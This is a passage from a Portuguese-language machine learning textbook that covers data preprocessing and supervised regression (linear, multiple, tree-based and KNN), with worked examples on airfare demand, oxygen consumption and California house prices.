existem diversas abordagens, entre elas, preencher os elementos faltantes com 
a média ou a mediana dos registros ou então remover os registros da análise. 
A remoção tem a desvantagem da perda de informações, mas em alguns 
casos não há solução, por outro lado, o preenchimento com a média insere 
valores que não são exatos e para cada projeto é necessário validar qual a 
melhor estratégia. A Figura 1.4 abaixo ilustra um dataset com alguns registros 
faltantes (NaN – Not a Number, -) 
 
Figura 1.4: Dataset com valores faltantes 
 
Outra questão importante em projetos de Machine Learning é a conversão 
de dados simbólicos em numéricos. Isso se deve ao fato de que a maioria dos 
modelos só conseguem processar dados numéricos. Para clarificar esse 
conceito vamos tomar como exemplo o dataset da Figura 1 no qual temos a 
variável (coluna) Sexo com valores “M” ou “F”. Nesse caso, “M” pode ser 
representado por 1 e “F” por 0. Veja a Figura 1.5 abaixo. 
 

 
 
 
Figura 1.5: Dataset com variável Sexo convertida 
 
A variável Escolaridade apresenta uma situação interessante pois possui três 
valores distintos (Superior, Médio e Pós-graduação). A mesma lógica 
empregada na variável Sexo pode ser aplicada aqui, mas pela quantidade maior 
de opções irá gerar mais colunas. 
 
Figura 1.6: Dataset com variáveis categóricas convertidas 
Esse tipo de abordagem na qual variáveis categóricas são convertidas em 
numéricas é também conhecido como One-Hot-Encoding. As variáveis binárias 
criadas para representar as variáveis categóricas são conhecidas como dummy. 
Outro ponto crucial na etapa de pré-processamento dos dados é o de 
padronização, o qual leva todos os valores registrados para um mesmo patamar 
de comparação. O dataset da Figura 1.2 nos ajuda a entender essa situação ao 
tomar como exemplo as variáveis “Peso” e “Altura”. De forma geral, a altura de 
uma pessoa é um número maior do que zero e menor do que 2,5, considerando 
a unidade de medida metros (m). O peso de uma pessoa também é um número 
maior do que zero e normalmente abaixo de 150, considerando a unidade de 
medida quilogramas (kg). Vale ressaltar que obviamente podem existir pessoas 

 
 
com medidas superiores às comentadas, mas aqui nesse texto, iremos nos ater 
a poucos valores para fins pedagógicos. Considerando essa explicação, vemos 
que os valores de peso e altura estão em patamares bem diferentes, e isso pode 
levar os modelos de Machine Learning a não compreenderem bem a relação 
entre os dados, ou mesmo atribuir maior importância a um conjunto por possuir 
valores muito maiores do que o outro conjunto. Para mitigar esse problema, 
aplica-se um procedimento de transformação aos dados que padroniza todos 
baseado em uma lógica. A Figura 1.7 mostra o mesmo dataset da Figura 1.2, 
mas agora com as variáveis “Peso” e “Altura” transformadas. 
 
Figura 1.7: Dataset com variáveis “Altura” e “Peso” transformadas 
 
Vale 
destacar 
que 
existem 
vários 
tipos 
de 
métodos 
para 
padronizar/transformar os dados, dentre eles se destacam o mínimo e máximo 
(MinMax) e a estandardização (Standardization). Em muitos casos, uma certa 
transformação pode ajudar os algoritmos a performarem melhor e por isso, cabe 
ao profissional de Ciência de Dados juntamente com a equipe do projeto definir 
qual abordagem é a mais adequada. A Figura 6 mostra o resultado da 
padronização após a utilização do método MinMax que tem por base pegar um 
valor mínimo e um valor máximo no conjunto observado. A coluna “Peso” 
possuía o valor máximo de 101 na terceira linha e após o MinMax se transformou 
em 1, enquanto o valor mínimo era de 77 e agora é 0. Dessa forma, a lógica aqui 
é transformar todos os valores que estão entre 77 e 101 para uma nova faixa de 
valores correspondentes entre 0 e 1. 
Um fator muito impactante em projetos que utilizam ML é o uso de dados 
não balanceados, ou seja, dados que possuem determinada característica ou 

 
 
são provenientes de determinado grupo e aparecem mais do que outros. A 
Figura 6 possui uma coluna com a escolaridade de um grupo de pessoas e é 
fácil perceber que a maioria possui ensino médio, enquanto apenas uma possui 
pós-graduação. Se um algoritmo de ML for treinado nessa base de dados para 
atingir qualquer objetivo que seja, provavelmente, a falta de exemplos de 
pessoas com pós-graduação fará falta para que o modelo possa compreender 
os padrões inerentes dessa categoria. São inúmeras as técnicas para atacar o 
problema de balanceamento dos dados, mas só para citar algumas, é possível 
aplicar estratégias de reamostragem nos dados com o intuito de apresentar de 
forma justa a mesma quantidade de exemplos de diferentes classes/grupos. 
Pode-se simplesmente descartar uma parte dos dados no conjunto com maior 
número de exemplos a fim de parear as quantidades de amostras. Existem 
também bibliotecas especialistas na criação de dados sintéticos que podem ser 
utilizadas para completar os dados com menor representatividade a fim de tornar 
o treinamento dos algoritmos de ML mais balanceados. O fato é que não existe 
técnica perfeita e um entendimento claro do problema se faz necessário antes 
da tomada de decisão. 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 3 APRENDIZADO SUPERVISIONADO - REGRESSÃO 
 
Nesse momento já somos capazes de aplicar operações e transformações aos 
dados. Toda a parte de pré-processamento torna os dados disponíveis para que 
os modelos de machine learning possam tirar o máximo de proveito. 
OBJETIVOS DA UNIDADE 3 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar um modelo de regressão 
 
• Analisar as relações existentes nos dados 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.1. REGRESSÃO LINEAR SIMPLES 
 
A regressão linear é uma técnica estatística que tem por objetivo ajustar 
uma reta a um conjunto de dados. Para isso, parte-se do pressuposto que temos 
uma variável dependente que explica uma variável resposta. Nesse caso, tem-
se uma equação da forma 
 𝑦= 𝑎𝑥+ 𝑏                                               Equação 3.1 
na qual a representa o coeficiente angular, b o coeficiente linear, x é a variável 
independente e y é a resposta esperada. O intuito é estimar os parâmetros a e 
b da equação de maneira que o resultado seja o mais próximo do real. Para 
ilustrar melhor a situação, imagine um exemplo em que a demanda de 
passagens aéreas depende do preço dessas passagens. Com certeza existem 
diversos fatores que influenciam nessa demanda, mas para fins didáticos nesse 
texto, consideraremos apenas a variável preço. A Tabela 3.1 apresenta valores 
das variáveis para esse problema. 
 
Demanda 
Preço da passagem 
121 
110 
108 
112 
97 
130 
90 
125 
83 
170 

 
 
66 
167 
60 
200 
55 
240 
42 
231 
33 
239 
32 
220 
34 
236 
28 
230 
27 
255 
20 
268 
Tabela 3.1: Valores das variáveis para o problema de demanda por passagens 
aéreas 
 
Olhando a Tabela 3.1 percebe-se uma tendência de diminuição na 
demanda por passagens na medida em que o preço das passagens aumenta. 
Estamos interessados em descobrir qual é a equação da reta que se ajusta da 
melhor maneira a esse conjunto de dados e descreve essa relação. 
Os trechos de código abaixo (Figura 3.1 e Figura 3.2), escritos em 
linguagem Python, utilizando as bibliotecas Pandas, Matplotlib e Seaborn 

 
 
(Hunter, 2007; The pandas development team, 2024; Waskom, 2021), exibem a 
implementação do problema, primeiro definindo o conjunto de dados e em 
seguida montando o gráfico. Vale ressaltar que são implementações simples 
com objetivo pedagógico e que pode haver diversos níveis de personalização e 
aprofundamento nas análises. A Figura 3.3 exibe uma perspectiva gráfica 
desses dados exibindo a dispersão dos pontos e juntamente uma reta que possui 
o melhor ajuste aos dados. 
 
 
Figura 3.1: Definição dos dados para o problema de demanda por passagens 
aéreas 
 
 
Figura 3.2: Código que constrói o gráfico dos dados para o problema de 
demanda por passagens aéreas 

 
 
 
Figura 3.3: Relação entre o preço da passagem aérea e a demanda por 
passagens 
 
Para ajustar uma regressão linear será utilizada a biblioteca scikit-learn 
(Pedregosa et al., 2011) que já possui a implementação matemática e 
disponibiliza de forma facilitada métodos para avaliar a qualidade dos resultados. 
Os trechos de código abaixo ilustram a solução. 
 

 
 
 
Figura 3.4: Transformação dos dados utilizando MinMax 
 
A Figura 3.4 mostra os dados já padronizados pelo método MinMax. Esse 
processo é realizado antes de aplicar os dados ao modelo de regressão 
constituindo um scaler ajustado que pode ser utilizado posteriormente para 
transformar novos dados. Como dito anteriormente, a padronização dos dados 
antes de aplicá-los a um modelo estatístico ou de ML é benéfica uma vez que 
remove as diferenças naturais de grandezas distintas que foram mensuradas.  A 
primeira linha dessa célula de código importa o método que irá padronizar os 
dados, a segunda linha instancia o objeto (esse texto não irá tratar do paradigma 
de programação orientada a objetos) MinMaxScaler, na terceira linha o ajuste 
necessário para a transformação é feito, na quarta linha é criada uma estrutura 

 
 
de dataframe proveniente da biblioteca Pandas e finalmente os novos dados são 
exibidos. 
 
Figura 3.5: Implementação de um modelo de regressão linear simples 
 
A Figura 3.5 mostra a implementação de uma regressão linear simples 
utilizando os métodos da biblioteca Scikit-learn. A primeira célula faz a 
importação do método que ajusta o modelo aos dados, instancia o objeto de 
regressão linear e, na sequência, ajusta aos dados. As duas células logo abaixo 
da definição do modelo mostram o coeficiente angular e o coeficiente linear da 
reta de regressão. Dessa forma, a equação ajustada para o problema de 
demanda por passagens aéreas é (apresentando apenas quatro casas 
decimais): 
𝑦= −90.4402𝑥+ 108.6931                               Equação 3.2 
A partir de agora tem-se um modelo de regressão linear simples ajustado, 
que na prática é a Equação 3.2. De posse disso, podemos fazer previsões com 

 
 
novos dados, que não foram utilizados no ajuste do modelo, para prever os 
valores de demanda por passagens aéreas. Imagine a situação em que uma 
companhia aérea tenha ajustado esse modelo para que sua gestão possa ter 
maior previsibilidade da demanda com base nos preços de passagens adotados. 
De agora em diante eles podem analisar a demanda esperada para diferentes 
preços. Veja abaixo um exemplo no qual estamos interessados em saber a 
previsão de demanda por passagens aéreas para um preço de passagem igual 
a R$ 227,00. 
 
 
Figura 3.6: Previsão de demanda por passagens aéreas 
 
No trecho de código acima, na primeira linha da primeira célula de código 
a biblioteca Numpy (Harris et al., 2020) é importada para realizar alguns ajustes 
nos dados e em seguida utiliza-se o scaler MinMax previamente ajustado para 
transformar o preço de 227 para um novo valor entre 0 e 1. Esse novo preço 
transformado é então aplicado ao modelo de regressão linear já ajustado e 
finalmente obtém-se a resposta 41.72 na terceira célula. De forma simples, esse 
bloco acima está mostrando que se o preço de uma passagem aérea for R$ 
227,00 espera-se que a demanda por passagens seja de aproximadamente 41. 
Vale reforçar que esse resultado é uma previsão e não necessariamente irá 
representar a realidade, mas um valor próximo com base nas informações 
disponíveis. Além disso, esse modelo pode prever diversos valores ao mesmo 

 
 
tempo e não apenas um como no exemplo, basta passar um vetor com um 
conjunto de valores. Na prática, ao se ajustar um modelo de regressão, inserimos 
variáveis que possivelmente explicam o problema e obtemos uma previsão dos 
valores. Isso é utilizado pela gestão para tomar uma decisão. 
Como observação final para esse tópico, destaca-se que nesse texto não 
aprofundaremos na metodologia para ajuste dos parâmetros a e b da regressão 
linear que podem ser obtidos pelo método dos mínimos quadrados por exemplo. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.2. REGRESSÃO LINEAR MÚLTIPLA 
 
A regressão linear múltipla segue exatamente o mesmo racional 
apresentado pela regressão linear simples, porém nesse caso, existe mais do 
que uma variável preditora, ou seja, a ideia aqui é de que existem pelo menos 
duas variáveis que explicam uma determinada variável resposta. Veja o exemplo 
a seguir extraído do livro (Morettin & Singer, 2023): 
 
Os dados da Tabela 2 foram extraídos de um estudo em que um dos 
objetivos era avaliar o efeito do índice de massa corpórea (IMC) e da carga 
aplicada numa esteira ergométrica no consumo de oxigênio (VO2) numa 
determinada fase do exercício. 
 
índice 
V02 
IMC 
carga 
índice 
V02 
IMC 
carga 
1 
14,10 
24,32 
71,00 
15 
22,00 
22,45 
142,00 
2 
16,30 
27,68 
91,00 
16 
13,20 
30,86 
62,00 
3 
9,90 
23,93 
37,00 
17 
16,20 
25,79 
86,00 
4 
9,50 
17,50 
32,00 
18 
13,40 
33,56 
86,00 
5 
16,80 
24,46 
95,00 
19 
11,30 
22,79 
40,00 
6 
20,40 
26,41 
115,00 
20 
18,70 
25,65 
105,00 
7 
11,80 
24,04 
56,00 
21 
20,10 
24,24 
105,00 

 
 
8 
29,00 
20,95 
104,00 
22 
24,60 
21,36 
123,00 
9 
20,30 
19,03 
115,00 
23 
20,50 
24,48 
136,00 
10 
14,30 
27,12 
110,00 
24 
29,40 
23,67 
189,00 
11 
18,00 
22,71 
105,00 
25 
22,90 
21,60 
135,00 
12 
18,70 
20,33 
113,00 
26 
26,30 
25,80 
189,00 
13 
9,50 
25,34 
69,00 
27 
20,30 
23,92 
95,00 
14 
17.5 
29,93 
145,00 
28 
31,00 
24,24 
151,00 
Tabela 3.2: Dados do experimento de consumo de oxigênio 
 
A partir desse exemplo serão incluídos alguns conceitos a mais em 
relação à análise de resultados. Primeiramente, é necessário avaliar se o ajuste 
do modelo de regressão é bom o suficiente para ser utilizado em previsões 
futuras, e por isso vamos separar uma parte dos dados da tabela acima para 
testar o modelo. A ideia é escolher um percentual dos dados para ajustar/treinar 
e a outra parte para avaliar o resultado. Dessa forma, o modelo não tem 
conhecimento a respeito dos dados separados para o teste. Em especial, para 
modelos de regressão, são necessárias métricas que indiquem o quão perto a 
resposta está do resultado real. Métricas como o coeficiente de determinação 𝑅! 
(R2) e o erro absoluto percentual médio (MAPE) conseguem estimar essa 
aproximação. Para o R2, quanto mais próximo de 1 (1 corresponde à 100%) 
melhor e para o MAPE quanto mais próximo de zero melhor. O R2 mede a 
porcentagem da variação total dos valores da variável resposta (y) em relação à 
sua média explicada pelo modelo de regressão (Morettin & Singer, 2023) 

 
 
enquanto o MAPE mede o erro percentual absoluto entre esses valores. Vamos 
apresentar agora alguns trechos de código para a solução desse problema. 
 
 
Figura 3.7: Trecho de código para fazer um gráfico ilustrando a dispersão das 
variáveis IMC, carga em relação ao consumo de oxigênio (VO2) 
 
 
Figura 3.8: Gráfico ilustrando a dispersão das variáveis 
 
O primeiro quadro da Figura 3.8 mostra a relação entre IMC e VO2 e 
aparentemente existe uma relação inversamente proporcional, ou seja, quanto 
maior o IMC menor o VO2, mas não é uma relação tão forte. No segundo quadro 
entretanto, parece haver uma relação clara de aumento das duas variáveis, 
quanto maior a carga, maior o VO2. 

 
 
 
Figura 3.9: Separação dos dados em treino e teste 
 
Na Figura 3.9, utilizando o método train_test_split da biblioteca scikit-learn 
dividimos os dados disponíveis na Tabela 3.2 em treino e teste, sendo que o 
parâmetro test_size indica que 30% dos dados serão utilizados no teste do 
modelo de regressão, o que implica diretamente que 70% dos dados serão 
utilizados no ajuste/treino do modelo. Essa proporção 70/30 é uma prática 
comum entre os cientistas de dados, mas não é obrigatória, podendo ser 80/20, 
90/10 ou qualquer outro valor que faça sentido no projeto. 
 
Os dados são então padronizados como já feito anteriormente (MinMax). 
Aqui vale uma observação conceitual: O scaler utilizado para padronizar os 
dados é inicialmente ajustado somente no conjunto de treinamento (70%) e 
então aplicado aos dados restantes de teste (30%) para fazer a transformação. 
Na prática, 70% dos dados entram no scaler que faz o cálculo para transformar 
tudo e definir novos valores entre 0 e 1, e a partir daí, com o cálculo já feito, os 
outros 30% dos dados são transformados na sequência. Isso se deve ao fato de 
que quando padronizamos os dados, o scaler leva em consideração o conjunto 
completo aplicado a ele, ou seja, ele “tem conhecimento” de 100% dos dados na 
hora de padronizar/transformar e, portanto, os dados de teste carregam consigo 
informações a respeito dos dados de treinamento. Esse problema é conhecido 
como vazamento de dados e para evitá-lo é necessário padronizar os dados 
somente após a divisão do conjunto em treino e teste. A padronização dos dados 
após a separação do conjunto garante o isolamento das amostras, de forma que 
o ajuste será feito de maneira realmente justa, sem que o modelo tenha qualquer 
informação a respeito dos dados de teste. Isso garantirá que o desempenho 
medido no conjunto de testes é realmente robusto e não foi afetado por alguma 
“dica” prévia. 

 
 
 
Toda essa discussão relativa à avaliação da performance do modelo, bem 
como a separação dos dados de treino e teste se aplica a qualquer modelo 
supervisionado de ML e por isso, esses procedimentos serão repetidos em 
exemplos à frente. 
 
 
Figura 3.10: Primeiros cinco registros dos dados de treinamento e teste 
 
A Figura 3.10 apresenta os dados de treinamento e teste que foram 
utilizados no modelo de regressão linear múltipla. Somente os cinco primeiros 
registros são exibidos. Na parte superior da figura estão os dados de treino e 
teste já padronizados (MinMax), lembrando que o modelo possui duas variáveis 
preditoras: IMC e carga. Na parte inferior está a variável resposta (VO2) também 
dividida em treino e teste. Não há necessidade de padronizar a variável resposta 
uma vez que o modelo é capaz de ajustar seus parâmetros para qualquer faixa 
de valores. 
Finalmente na Figura 3.11 vemos o trecho de código correspondente ao 
ajuste do modelo de regressão utilizando os dados de treinamento e na 

 
 
sequência os coeficientes para cada variável (IMC e carga) e o coeficiente linear 
(constante). 
 
 
Figura 3.11: Trecho de código com ajuste do modelo de regressão linear 
múltipla 
Podemos agora exibir a equação do modelo ajustado: 
 
𝑦= −5.9621𝑥" + 20.8784𝑥! + 12.7354                  Equação 3.3 
 
Nessa equação 𝑥" representa a variável IMC e 𝑥!, variável carga e y é o consumo 
de oxigênio (VO2). 
Para finalizar o exemplo é necessário avaliar a qualidade do modelo 
utilizando as métricas (R2 e MAPE) comentadas anteriormente. Com o modelo 
ajustado utiliza-se o método predict para obter previsões do modelo em cima dos 
dados de teste (não vistos pelo modelo anteriormente). Veja a Figura 3.12 
abaixo: 
 

 
 
 
Figura 3.12: Comparação entre os valores preditos pelo modelo de regressão 
linear múltipla e valores reais 
 
Na célula superior da Figura 3.12 é possível ver os valores preditos pelo 
modelo, ou seja, no caso em que aplicamos informações de IMC e carga à 
regressão, essa é a sua resposta para cada par de dados. Na célula inferior da 
Figura 3.12 estão os dados reais, deixados à parte (não vistos pelo modelo) para 
testar a performance do modelo. É possível perceber que ao comparar os dois 
conjuntos de dados tem-se respostas de certa forma próximas, o que é bom e 
indica que a regressão linear está com um ajuste pelo menos razoável. 
Finalmente a Figura 3.13 ilustra os resultados de R2 e MAPE que são produzidos 
comparando as respostas da regressão linear múltipla e os dados reais de teste 
por meio dos métodos r2_score e mean_absolute_percentage_error da 
biblioteca Scikit-learn. Como explicado anteriormente, o R2 mais próximo de 1 é 
melhor e nesse caso tem-se 0,6459 (64,59%) que é bom, mas não excepcional. 
Além disso, o MAPE é 0,1754 (17,54%) que é um valor aceitável, mas não 
excelente. A avaliação de modelos estatísticos e de ML deve ser conduzida 
sempre com cautela e atenção visto que para cada projeto existem um nível de 
erro tolerável e que faz sentido para o negócio. Dessa forma, recomenda-se 
atenção redobrada e discussão com a equipe. 
 

 
 
 
Figura 3.13: Resultados de R2 e MAPE para a regressão linear múltipla 
 
Uma análise bastante relevante ao se utilizar modelos de regressão linear 
é a importância das variáveis que estão sendo utilizadas no modelo e como 
essas variáveis afetam o resultado. No problema do consumo de oxigênio 
estudado, temos as variáveis carga e IMC. Olhando a Equação 3.3 percebe-se 
que o coeficiente da variável IMC (𝑥") é -5.9621, que indica uma relação 
inversamente proporcional à variável resposta y (consumo de oxigênio), ou seja, 
quanto maior o IMC menor será y. Além disso, o coeficiente da variável carga é 
20,8784, indicando uma relação diretamente proporcional com a variável 
resposta y, e, portanto, quanto maior a carga, maior será o consumo de oxigênio. 
Essa relação é percebida também na Figura 14. Além disso, se olharmos o valor 
dos coeficientes em módulo 20,8784 é bem maior do que 5,9621, o que indica 
que a variável carga é mais importante, ou seja, tem mais impacto no resultado 
do modelo do que a variável IMC. Analisar os coeficientes do modelo de 
regressão trás informações importantes e direciona o entendimento do resultado. 
Finalmente, é necessário falar dos gráficos de resíduos da regressão, que 
são ferramentas diagnósticas interessantes capazes de mostrar tendências nos 
dados. Os resíduos são calculados fazendo a diferença entre os dados reais e 
os dados preditos pelo modelo de regressão linear (𝑟𝑒𝑠𝑖𝑑𝑢𝑜𝑠= 𝑦#$%& −𝑦'#$(). A 
Figura 3.14 mostra os resíduos gerados para as variáveis IMC e carga e a Figura 
3.15 mostra o gráfico de resíduos comparando com os valores preditos pelo 
modelo. 

 
 
 
 
 
Figura 3.14: Resíduos do modelo de regressão linear múltipla para as variáveis 
IMC e carga 
 

 
 
 
Figura 3.15: Resíduos do modelo de regressão linear múltipla 
 
Em todos os três gráficos não é visto nenhum tipo de tendência ou padrão 
nos pontos, pelo contrário, eles estão dispersos de forma aleatória. Alguns 
pontos estão um pouco mais afastados, o que pode indicar presença de outliers 
nos dados. Certamente o modelo implementado nesse exemplo precisa de mais 
análise além da necessidade de explorar mais estratégias de pré-processamento 
e ajuste de dados, entretanto, o exercício feito aqui, ilustra o ponto de partida 
para a implementação de modelos de regressão linear. 
 
 
 
 

 
 
3.3. MODELO DE REGRESSÃO BASEADO EM ÁRVORE 
 
Modelos baseados em árvores são constituídos por nós conectados que 
tem a função de tomar decisões relativas ao fluxo de dados, ou seja, os dados 
são inseridos no modelo e de acordo com a regras estabelecidas em cada nó, 
os dados seguirão um “caminho” até a saída do resultado. A Figura 3.16 possui 
um diagrama simples ilustrando a ideia de um modelo baseado em árvore. 
 
 
Figura 3.16: Diagrama de representação de um modelo baseado em árvore 
 
Os retângulos verdes são denominados nó folha, pois são a parte final em 
cada caminho e possuem a respectiva resposta. O primeiro nó (x1 < 30) é 
denominado raiz e os demais são nós de divisão visto que contém testes para 
as tomadas de decisões. Em resumo, modelos baseados em árvores trabalham 

 
 
de forma a dividir problemas complexos em problemas menores. O exemplo 
acima apresenta apenas duas variáveis x1 e x2, porém podem existir diversas 
outras variáveis. 
Para formalizar o funcionamento via código Python, veja o exemplo a 
seguir no qual tem-se um conjunto de dados contendo diversas características a 
respeito de casas no estado da Califórnia (disponível em: link). O objetivo é 
conseguir predizer o preço mediano de uma casa com base nas características 
fornecidas, ou seja, implementar um modelo de regressão que seja capaz 
capturar as relações entre as variáveis de maneira a explicar o preço das casas. 
 
 
Figura 3.17: Dataset relativo ao problema dos preços das casas no estado da 
Califórnia 
 
A Figura 3.17 ilustra o conjunto de dados relativo ao problema. Nele 
podemos ver informações relativas à localização da casa (latitude e longitude), 
idade da casa, total de salas, total de quartos, população do quarteirão, a 
quantidade de famílias no quarteirão, média salarial das famílias no quarteirão, 
proximidade com o mar e finalmente o valor mediano da casa que é a variável a 
ser predita. 
A lógica de desenvolvimento desse problema é muito semelhante ao 
exemplo anterior e para iniciar será necessário realizar um pré-processamento 
nos dados que envolve, como já explicado, limpeza, conversões e 
transformações nos dados. A Figura 3.18 a seguir mostra dois conjuntos de 
dados: X_train_transformed e X_test_transformed. Aqui o dataset da Figura 3.18 
foi dividido em duas partes (treino e teste) e então padronizado utilizando 

 
 
estandardização e a variável ocean_proximity foi convertida utilizando one-hot-
encoding em INLAND, ISLAND, NEAR BAY e NEAR OCEAN.  
Lembrando que os dados de treino serão utilizados para que o modelo 
aprenda os padrões necessários para predizer o alvo e na sequência a qualidade 
das predições serão mensuradas utilizando os dados de teste. 
 
 
Figura 3.18 Conjunto de dados pré-processados e divididos em treino e teste 
 
De posse dos dados pré-processados, eles já podem ser utilizados para 
treinar e testar os modelos. A Figura 3.19 mostra quatro células com as 
implementações necessárias para o modelo de árvore de regressão. 
 

 
 
 
Figura 3.19: Implementação do modelo de árvore de regressão 
 
A primeira célula exibida na Figura 3.19 importa o modelo de árvore de 
regressão da biblioteca scikit-learn, na sequência o modelo é instanciado e na 
terceira linha o modelo é ajustado (treinado) por meio do método fit. Finalmente, 
a última célula gera a predições da árvore de regressão com base nos dados de 
teste, ou seja, o modelo irá gerar respostas com base no seu treinamento. As 
predições do modelo precisam ser avaliadas quanto à sua qualidade e isso é 
feito pelas métricas R2 e MAPE que já foram explicadas anteriormente. A Figura 
3.20 mostra essas métricas calculadas. 
 

 
 
 
Figura 3.20: Métricas de qualidade do modelo de árvore de regressão 
 
O R2 é aproximadamente 63% que é um bom resultado, enquanto o 
MAPE está em torno de 24%, sendo considerado um pouco mais alto. Dizer se 
o modelo é bom de verdade é um pouco mais complicado, e isso vai depender 
da tolerância à erro do projeto, qualidade dos dados e expectativas da equipe. 
Como já dito anteriormente, essa validação de qualidade deve ser feita sempre 
com cuidado. 
Como já foi dito na parte de regressão linear, é extremamente relevante 
em modelos de ML compreender a importância das variáveis. Especificamente 
para o modelo de árvore de regressão, uma das técnicas utilizadas para 
compreender a importância das variáveis é o índice Gini. A biblioteca scikit-learn 
fornece de maneira simples esses valores já calculados. A Figura 3.21 exibe o 
trecho de código de obtém os valores do índice Gini para cada variável do 
modelo. 
 
 
 
 
 

 
 
 
Figura 3.21: Obtenção dos valores do índice Gini e construção de dataframe 
para esses valores 
 
A tabela exibida na Figura 3.22 mostra todos os valores do índice Gini 
para cada variável em ordem decrescente. 
 
Figura 3.22: Valores do índice Gini para cada variável da árvore de regressão 

 
 
Uma maneira ainda mais simples de ver esses resultados é por meio de 
um gráfico de barras. As figuras (Figura 3.23 e Figura 3.24) abaixo mostram a 
implementação e exibem esse gráfico. 
 
 
Figura 3.23: Implementação de um gráfico de barras utilizando as bibliotecas 
matplotlib e seaborn 
 
No trecho de código acima a biblioteca matplotlib é utilizada para controlar 
aspectos da figura e o método barplot da biblioteca seaborn efetivamente faz o 
gráfico a partir dos valores exibidos na tabela contida na Figura 3.24. 
 
 
Figura 3.24: Importância das variáveis em no algoritmo árvore de regressão 

 
 
Vale ressaltar que o índice Gini e até mesmo os coeficientes da regressão 
linear vistos anteriormente não são as únicas maneiras de avaliar a importância 
das variáveis. Existem diversas outras técnicas, dentre as quais pode-se 
destacar os valores de shapley (shap) (Lundberg & Lee, 2017). Esse texto não 
irá abordar essas outras estratégias, mas fica a cargo do leitor buscar e 
aprofundar. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.4 MODELO DE REGRESSÃO BASEADO NO ALGORITMO DOS K VIZINHOS 
MAIS PRÓXIMOS 
O algoritmo dos k vizinhos mais próximos (KNN) funciona com base no 
cálculo de distâncias entre os dados. O valor de k é justamente a quantidade de 
vizinhos que serão utilizados na comparação da distância. O KNN pode ser 
utilizado tanto para problemas de classificação quanto regressão. Um ponto 
importante a se destacar é que esse algoritmo funciona por memorização dos 
dados de treinamento e seus respectivos resultados, não sendo um treinamento 
direto com ajuste de parâmetros com base em alguma estratégia. Na fase de 
operação (classificação ou predição) a distância entre os dados de teste é 
comparada aos dados memorizados no treinamento e a resposta é gerada com 
base na menor distância. 
Para clarificar seu funcionamento, vamos fazer uma simplificação do 
problema de predição do preço de uma casa já abordado no tópico anterior. A 
Tabela 3.3 abaixo mostra cinco pares de registros fictícios contendo cada um a 
área construída de uma casa e seu respectivo preço. Os dados dessa tabela são 
o conjunto de treinamento do algoritmo. 
 
Área (m2) 
Preço 
100 
150000 
120 
170000 
150 
200000 
180 
220000 

 
 
200 
250000 
Tabela 3.3: Valores fictícios de área construída e preço de casas 
O objetivo agora é prever o preço de uma casa que possui 160 m2 de área 
construída utilizando o KNN. O primeiro passo aqui é determinar o valor de k, 
que nesse caso, será igual a 3. O segundo passo é calcular a distância euclidiana 
entre cada amostra apresentada no conjunto de treinamento e a variável 
disponível no conjunto a ser predito. Vale ressaltar aqui que para esse exemplo 
simples tem-se apenas uma variável (Área), portanto a comparação será feita 
entre cada valor de área da Tabela 3.3 (conjunto de treinamento) e a área de 
160 fornecido como variável para predição. 
Se houvesse mais variáveis relacionadas às características da casa como 
no exemplo da seção anterior, a distância seria calculada entre cada variável 
disponível. A Equação 3.4 (Faceli et al., 2023) abaixo é a base do algoritmo. 
 
𝑑;𝑥), 𝑥*= = >∑
(𝑥)
& −𝑥*
&)!
(
&+"
                               Equação 3.4 
 
Na equação acima 𝑥) e 𝑥* são vetores e 𝑥)
& e 𝑥*
& são elementos desses 
vetores. O índice l indica cada atributo contido no vetor. Na prática, o vetor com 
índice i representa as características (variáveis) no conjunto de treinamento e o 
vetor com índice j representa as características (variáveis) no conjunto de teste. 
 
Fazendo os cálculos utilizando os dados da Tabela 3.3 temos a Tabela 
3.4 a seguir: 
 

 
 
Área (m2) 
Preço 
Cálculo 
Distância 
100 
150000 
B(100 −160)! 
60 
120 
170000 
B(120 −160)! 
40 
150 
200000 
B(150 −160)! 
10 
180 
220000 
B(180 −160)! 
20 
200 
250000 
B(200 −160)! 
40 
Tabela 3.4: Cálculo das distâncias para o algoritmo KNN 
 
Agora que as distâncias foram calculadas, utiliza-se a quantidade de 
vizinhos para fazer o cálculo da média dos valores finais. Escolhendo as três 
(k=3) menores distâncias calculadas tem-se: 10, 20 e 40. Dessa forma os preços 
correspondentes às menores distâncias são: 200000, 220000 e 170000. 
Calculando a média desses três preços resulta em 196666,66. Portanto, o valor 
predito para uma casa com 160 m2 de área é R$ 196666,00. Esse exemplo pode 
ser facilmente implementado em Python como mostra o trecho de código abaixo 
na Figura 3.25: 
 
 
 

 
 
 
Figura 3.25: Implementação do KNN para o exemplo do preço da casa em 
função da área em Python 
 
Vamos agora aplicar o algoritmo KNN ao problema dos preços das casas 
na Califórnia já apresentado na seção anterior. Já foram apresentadas métricas 
de qualidade dos algoritmos de regressão, importância de variáveis e alguns 
gráficos, mas ainda não ficou explícita a comparação entre os dados reais e os 
dados preditos por um algoritmo de regressão, e por isso, vamos implementar 
agora. O procedimento é exatamente o mesmo que foi adotado para a árvore de 
regressão, a única diferença é que agora aplica-se o método KNN que também 
é implementado pela biblioteca scikit-learn e sua importação é mostrada na 
Figura 3.25. A Figura 3.26 abaixo compara no mesmo gráfico os valores reais de 
casas na California e os valores preditos pelo modelo KNN. 
 

 
 
 
Figura 3.26: Valores reais e preditos (KNN) para o problema do preço das 
casas na California 
 
Esse conjunto de dados possui 20640 amostras disponíveis das quais 
14448 foram utilizadas para treinamento do algoritmo e 6192 para teste. Foram 
utilizadas as mesmas variáveis que entraram na árvore de regressão 
anteriormente. Para fins de exibição apenas as 100 últimas amostras foram 
apresentadas no gráfico da Figura 3.26, visto que mostrar o resultado de 6192 
amostras iria deixar a representação muito poluída visualmente e pouco 
esclarecedora. Mas o que se percebe na Figura 3.26 é que os resultados preditos 
pelo KNN (linha laranja) são próximos dos resultados reais (linha azul), o que 
indica que essa abordagem é boa para capturar as relações entre os dados 
desse problema. Vale reforçar que o bom comportamento do gráfico não deve 
ser o único fator levado em consideração para decidir por um algoritmo ou outro, 

 
 
mas dá um indicativo. O R2 calculado para o KNN foi de aproximadamente 
68,76% e o MAPE = 23,27%. Em comparação ao algoritmo de árvore de 
regressão da seção anterior o KNN é levemente superior em relação 
exclusivamente a esses indicadores. 
Um fator importante de ser apresentado nesse texto é que o algoritmo 
